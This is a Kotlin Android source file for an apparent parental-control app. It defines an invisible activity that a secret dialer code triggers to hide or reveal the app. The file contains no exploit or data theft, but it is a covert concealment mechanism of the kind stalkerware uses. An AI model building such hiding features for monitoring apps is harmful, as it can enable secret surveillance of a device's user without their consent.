package com.example.parentalcontrol

import android.app.Activity
import android.os.Bundle
import android.util.Log

/**
 * SecretCodeActivity v27
 *
 * This Activity is the primary target for the *#1356365508# dialer code.
 * Starting an Activity from a Receiver is restricted on Android 10+,
 * but starting an Activity directly from the Dialer is always allowed.
 */
class SecretCodeActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            Log.i("SecretCodeActivity", "Dialer code detected — triggering stealth toggle")
            
            // Toggle the stealth state (Hide/Show)
            StealthManager.toggleStealthMode(this)
            
            // Close the activity immediately (it's Theme.NoDisplay)
            finish()
        } catch (e: Exception) {
            Log.e("SecretCodeActivity", "Fatal in trampoline: ${e.message}")
            finish()
        }
    }
}
